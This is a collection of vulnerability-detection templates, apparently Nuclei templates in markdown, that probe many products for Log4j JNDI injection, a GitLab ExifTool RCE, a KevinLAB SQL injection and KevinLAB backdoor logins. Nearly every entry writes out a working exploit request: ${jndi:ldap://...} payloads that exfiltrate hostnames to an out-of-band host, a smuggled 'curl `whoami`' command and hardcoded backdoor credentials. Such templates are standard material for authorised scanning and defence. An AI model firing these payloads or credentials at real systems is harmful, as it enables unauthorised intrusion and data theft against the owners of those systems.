# Apache Solr 7+ - Remote Code Execution (Apache Log4j)

## Description

- Apache Log4j2 \<=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. This vulnerability affects Solr 7+.

- severity - critical
- tags - cve,cve2021,solr,oast,log4j,rce,apache,jndi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.{{interactsh-url}}/a%7D

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Apache OFBiz - JNDI Remote Code Execution (Apache Log4j)

## Description

- Apache OFBiz is affected by a remote code execution vulnerability in the bundled Apache Log4j logging library. Apache Log4j is vulnerable due to insufficient protections on message lookup substitutions when dealing with user controlled input. A remote, unauthenticated attacker can exploit this, via a web request, to execute arbitrary code with the permission level of the running Java process.

- severity - critical
- tags - cve,cve2021,ofbiz,oast,log4j,rce,apache,jndi,kev

## Requests

### Step - 1

```
GET /webtools/control/main HTTP/1.1
Host: {{Hostname}}
Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.{{interactsh-url}}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# JamF Pro - Remote Code Execution (Apache Log4j)

## Description

- JamF is susceptible to Lof4j JNDI remote code execution. JamF is the industry standard when it comes to the management of iOS devices (iPhones and iPads), macOS computers (MacBooks, iMacs, etc.), and tvOS devices (Apple TV).

- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,jamf,oast,kev

## Requests

### Step - 1

```
POST / HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&password=

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

**Type - word**

- part - body
- words
  1. \<title>Jamf Pro Login\</title>

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Spring Boot - Remote Code Execution (Apache Log4j)

## Description

- Spring Boot is susceptible to remote code execution via Apache Log4j.
- severity - critical
- tags - cve,cve2021,springboot,rce,oast,log4j,kev

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}
X-Api-Version: ${jndi:ldap://${hostName}.{{interactsh-url}}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# GitLab CE/EE Unauthenticated RCE Using ExifTool

## Description

- GitLab CE/EE contains a vulnreability which allows a specially crafted image passed to a file parser to perform a command execution attack. Versions impacted are between 11.9-13.8.7, 13.9-13.9.5, and 13.10-13.10.2.
- severity - critical
- tags - oast,intrusive,hackerone,cve,cve2021,gitlab,rce,kev

## Requests

### Step - 1

```
GET /users/sign_in HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Step - 2

```
POST /uploads/user HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
X-CSRF-Token: {{csrf-token}}

{{hex_decode('0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358350D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2266696C65223B2066696C656E616D653D22746573742E6A7067220D0A436F6E74656E742D547970653A20696D6167652F6A7065670D0A0D0A41542654464F524D000003AF444A564D4449524D0000002E81000200000046000000ACFFFFDEBF992021C8914EEB0C071FD2DA88E86BE6440F2C7102EE49D36E95BDA2C3223F464F524D0000005E444A5655494E464F0000000A00080008180064001600494E434C0000000F7368617265645F616E6E6F2E696666004247343400000011004A0102000800088AE6E1B137D97F2A89004247343400000004010FF99F4247343400000002020A464F524D00000307444A5649414E546100000150286D657461646174610A0928436F7079726967687420225C0A22202E2071787B')}}curl `whoami`.{{interactsh-url}}{{hex_decode('7D202E205C0A2220622022292029202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020200A0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358352D2D0D0A')}}

```

### Matchers

**Type - word**

- words
  1. Failed to process image

**Type - status**

- status
  1. 422

### Extractors

**Type - regex**

- name - csrf-token
- internal - True
- group - 1
- regex
  1. csrf-token" content="(.\*?)" />

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z]+)

---

# Ivanti MobileIron - JNDI Remote Command Execution (Apache Log4j)

## Description

- Ivanti MobileIron Apache Log4j2 \<=2.14.1 JNDI in features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
- severity - critical
- tags - jndi,log4j,rce,cve,cve2021,ivanti,oast,mobileiron,kev

## Requests

### Step - 1

```
POST /mifs/j_spring_security_check HTTP/1.1
Referer: {{RootURL}}/mifs/user/login.jsp
Content-Type: application/x-www-form-urlencoded

j_username=${jndi:ldap://${hostName}.{{interactsh-url}}}&j_password=password&logincontext=employee

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - word**

- part - location
- words
  1. /mifs/user/login.jsp?error=1

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# JamF - Remote Code Execution (Apache Log4j)

## Description

- JamF is susceptible to Lof4j JNDI remote code execution. JamF is the industry standard when it comes to the management of iOS devices (iPhones and iPads), macOS computers (MacBooks, iMacs, etc.), and tvOS devices (Apple TV).

- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,jamf,oast,kev

## Requests

### Step - 1

```
POST / HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&password=

```

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Jamf Pro Login\</title>

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Cisco Unified Communications - Remote Code Execution (Apache Log4j)

## Description

- Cisco Unified Communications is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,cisco,kev,oast

## Requests

### Step - 1

```
POST /ccmadmin/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/ccmadmin/showHome.do

appNav=ccmadmin&j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Cisco vManage - Remote Code Execution (Apache Log4j)

## Description

- Cisco vManage is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. More information is available in the cisco-sa-apache-log4j-qRuKNEbd advisory.
- severity - critical
- tags - log4j,cisco,tenable,cve,cve2021,rce,jndi,kev,oast

## Requests

### Step - 1

```
@timeout: 20s
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}

j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin&submit=Log+In

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

**Type - word**

- part - body
- words
  1. \<title>Cisco vManage\</title>

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Apache Code42 - Remote Code Execution (Apache Log4j)

## Description

- Multiple Code42 components are impacted by the logj4 vulnerability. Affected Code42 components include:
- Code42 cloud: Updated Log4j from 2.15.0 to 2.17.1 on January 26, 2022
- Code42 app for Incydr Basic and Advanced and CrashPlan Cloud product plans: Updated Log4j from 2.16.0 to 2.17.1 on January 18, 2022
- Code42 User Directory Sync (UDS): Updated Log4j from 2.15.0 to 2.17.1 on February 2, 2022
- On-premises Code42 server: Mitigated from Log4j vulnerabilities by following these steps
- On-premises Code42 app: Updated to Log4j 2.16 on December 17, 2021

- severity - critical
- tags - jndi,log4j,rce,cve,cve2021,oast,code42,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&url=https://localhost

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Rundeck - Remote Code Execution (Apache Log4j)

## Description

- Rundeck is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,rundeck,kev,oast

## Requests

### Step - 1

```
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Connection: close
Referer: {{BaseURL}}/user/login

j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

**Type - word**

- part - location
- words
  1. {{BaseURL}}/user/error

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# OpenNMS - JNDI Remote Code Execution (Apache Log4j)

## Description

- OpenNMS JNDI is susceptible to remote code execution via Apache Log4j 2.14.1 and before. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

- severity - critical
- tags - jndi,log4j,rce,opennms,cve,cve2021,kev,oast

## Requests

### Step - 1

```
POST /opennms/j_spring_security_check HTTP/1.1
Referer: {{RootURL}}/opennms/login.jsp
Content-Type: application/x-www-form-urlencoded

j_username=${jndi:ldap://${hostName}.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# VMware Site Recovery Manager - Remote Code Execution (Apache Log4j)

## Description

- VMware Site Recovery Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

- severity - critical
- tags - cve,cve2021,jndi,log4j,rce,oast,vmware,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/dr/authentication/oauth2/oauth2login?error=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

**Type - word**

- part - body
- words
  1. \<title>Error - Site Recovery\</title>

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# UniFi Network Application - Remote Code Execution (Apache Log4j)

## Description

- UniFi Network Application is susceptible to a critical vulnerability in Apache Log4j (CVE-2021-44228) that may allow for remote code execution in an impacted implementation.

- severity - critical
- tags - cve,cve2021,rce,log4j,ubnt,unifi,oast,jndi,kev

## Requests

### Step - 1

```
POST /api/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json; charset=utf-8
Origin: {{RootURL}}
Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage

{"username":"user","password":"pass","remember":"${jndi:ldap://${hostName}.{{interactsh-url}}}","strict":true}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Graylog - Remote Code Execution (Apache Log4j)

## Description

- Graylog is susceptible to remote code execution via the Apache Log4j 2 library prior to 2.15.0 by recording its own log information, specifically with specially crafted values sent as user input.
- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,graylog,kev,oast

## Requests

### Step - 1

```
POST /api/system/sessions HTTP/1.1
Host: {{Hostname}}
Accept: application/json
X-Requested-With: XMLHttpRequest
X-Requested-By: XMLHttpRequest
Content-Type: application/json
Origin: {{BaseURL}}
Referer: {{BaseURL}}

{"username":"${jndi:ldap://${sys:os.name}.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

**Type - word**

- part - header
- words
  1. X-Graylog-Node-Id:

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Metabase - Remote Code Execution (Apache Log4j)

## Description

- Metabase is susceptible to remote code execution due to an incomplete patch in Apache Log4j 2.15.0 in certain non-default configurations. A remote attacker can pass malicious data and perform a denial of service attack, exfiltrate data, or execute arbitrary code.
- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,metabase,kev,oast

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/geojson?url=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

**Type - word**

- part - body
- words
  1. Invalid GeoJSON file location:

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Elasticsearch 5 - Remote Code Execution (Apache Log4j)

## Description

- Elasticsearch 5 is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

- severity - critical
- tags - jndi,log4j,rce,oast,elasticsearch,cve,cve2021,kev

## Requests

### Step - 1

```
GET /_search?a=$%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D HTTP/1.1
Host: {{Hostname}}

{

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# KevinLAB BEMS 1.0 - SQL Injection

## Description

- KevinLAB BEMS 1.0 contains a SQL injection vulnerability. Input passed through input_id POST parameter in /http/index.php is not properly sanitized before being returned to the user or used in SQL queries. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - kevinlab,sqli,edb,packetstorm

## Requests

### Step - 1

```
POST /http/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate

requester=login&request=login&params=[{"name":"input_id","value":"USERNAME' AND EXTRACTVALUE(1337,CONCAT(0x5C,0x5A534C,(SELECT (ELT(1337=1337,1))),0x5A534C)) AND 'joxy'='joxy"},{"name":"input_passwd","value":"PASSWORD"},{"name":"device_id","value":"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"},{"name":"checked","value":false},{"name":"login_key","value":""}]

```

### Matchers

**Type - word**

- words
  1. XPATH syntax error
  2. : '\ZSL1ZSL'
- condition - and

**Type - status**

- status
  1. 200

---

# KevinLAB HEMS - Backdoor Detection

## Description

- KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.

- severity - critical
- tags - kevinlab,default-login,backdoor

## Requests

### Step - 1

```
POST /dashboard/proc.php?type=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Connection: close

userid=kevinlab&userpass=kevin003

```

### Matchers

**Type - word**

- part - body
- words
  1. \<meta http-equiv="refresh" content="0; url=/">\</meta>

**Type - word**

- words
  1. \<script> alert
- negative - True

**Type - word**

- part - header
- words
  1. PHPSESSID

**Type - status**

- status
  1. 200

---

# GoAnywhere Managed File Transfer - Remote Code Execution (Apache Log4j)

## Description

- GoAnywhere Managed File Transfer is vulnerable to a remote command execution (RCE) issue via the included Apache Log4j.
- severity - critical
- tags - cve,cve2021,jndi,log4j,rce,oast,goanywhere,kev

## Requests

### Step - 1

```
GET /goanywhere/auth/Login.xhtml HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /goanywhere/auth/Login.xhtml HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}
Referer: {{RootURL}}/goanywhere/auth/Login.xhtml

formPanel%3AloginGrid%3Aname=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

### Extractors

**Type - regex**

- name - view
- part - body
- group - 1
- regex
  1. javax\.faces\.ViewState:1" value="(.\*)" autocomplete
- internal - True

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# KevinLAB BEMS (Building Energy Management System) - Backdoor Detection

## Description

- KevinLAB BEMS has an undocumented backdoor account, and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel, and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the BEMS is offering remotely.
- severity - critical
- tags - kevinlab,backdoor

## Requests

### Step - 1

```
POST /http/index.php HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%2C%7B%22name%22%3A%22device_key%22%2C%22value%22%3A%22a2fe6b53-e09d-46df-8c9a-e666430e163e%22%7D%2C%7B%22name%22%3A%22auto_login%22%2C%22value%22%3Afalse%7D%2C%7B%22name%22%3A%22login_key%22%2C%22value%22%3A%22%22%7D%5D

```

### Matchers

**Type - regex**

- part - body
- regex
  1. data":"[A-Za-z0-9-]+
  2. login_key":"[A-Za-z0-9-]+
- condition - or

**Type - word**

- part - body
- words
  1. "result":true

**Type - status**

- status
  1. 200

---

# VMware vRealize Operations Tenant - JNDI Remote Code Execution (Apache Log4j)

## Description

- VMware vRealize Operations is susceptible to a critical vulnerability in Apache Log4j which may allow remote code execution in an impacted vRealize Operations Tenant application.

- severity - critical
- tags - cve,cve2021,oast,rce,log4j,vmware,vrealize,kev

## Requests

### Step - 1

```
POST /suite-api/api/auth/token/acquire HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Origin: {{RootURL}}
Referer: {{RootURL}}/ui/

{"username":"${jndi:ldap://${hostName}.{{interactsh-url}}}","password":"admin"}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# VMware Horizon - JNDI Remote Code Execution (Apache Log4j)

## Description

- VMware Horizon is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,horizon,vmware,oast,kev

## Requests

### Step - 1

```
GET /portal/info.jsp HTTP/1.1
Host: {{Hostname}}
Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# VMware NSX - Remote Code Execution (Apache Log4j)

## Description

- VMware NSX is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,graylog,kev,oast

## Requests

### Step - 1

```
@timeout: 20s
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/login.jsp

username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin&submit=

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

**Type - word**

- part - location
- words
  1. /login.jsp?login_error=1

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# VMware HCX - Remote Code Execution (Apache Log4j)

## Description

- VMware HCX is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,vmware,kev,oast

## Requests

### Step - 1

```
@timeout: 10s
POST /hybridity/api/sessions HTTP/1.1
Host: {{Hostname}}
Accept: application/json
Content-Type: application/json
Origin: {{BaseURL}}

{
  "authType": "password",
  "username": "${jndi:ldap://${sys:os.name}.{{interactsh-url}}}",
  "password": "admin"
}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# VMware VCenter - Remote Code Execution (Apache Log4j)

## Description

- VMware VCenter is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,vcenter,vmware,oast,kev

## Requests

### Step - 1

```
GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: {{Hostname}}
X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# VMware Operations Manager - Remote Code Execution (Apache Log4j)

## Description

- VMware Operations Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
- severity - critical
- tags - cve,cve2021,rce,jndi,log4j,vmware,kev,oast

## Requests

### Step - 1

```
POST /ui/login.action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: {{BaseURL}}
Referer: {{BaseURL}}/ui/login.action
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

mainAction=login&userName=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+

**Type - word**

- part - header
- words
  1. Path=/ui

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# KevinLAB Devices Detection

## Description

